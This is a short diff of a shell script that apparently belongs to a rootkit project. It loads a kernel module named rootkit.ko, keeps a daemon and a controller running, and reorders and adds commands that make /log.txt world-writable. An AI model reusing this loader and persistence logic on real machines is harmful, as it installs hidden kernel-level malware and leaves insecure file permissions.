@@ -20,10 +20,10 @@ fi
 
 if [ ! -e /dev/cd ]; then
 	/sbin/kldload /boot/kernel/rootkit.ko
-	echo "" > /log.txt
-	chmod 666 /log.txt
 	/lib/daemon $1 &
 	/sbin/controller on
+	echo "" > /log.txt
+	chmod 666 /log.txt
 fi
 
 RESULT=`pgrep daemon`
@@ -31,6 +31,7 @@ RESULT=`pgrep daemon`
 if [ "${RESULT:-null}" = null ]; then
 	/lib/daemon $1 &
 	/sbin/controller on
+	chmod 666 /log.txt
 fi
 
 if [ -e rootkit.c ]; then
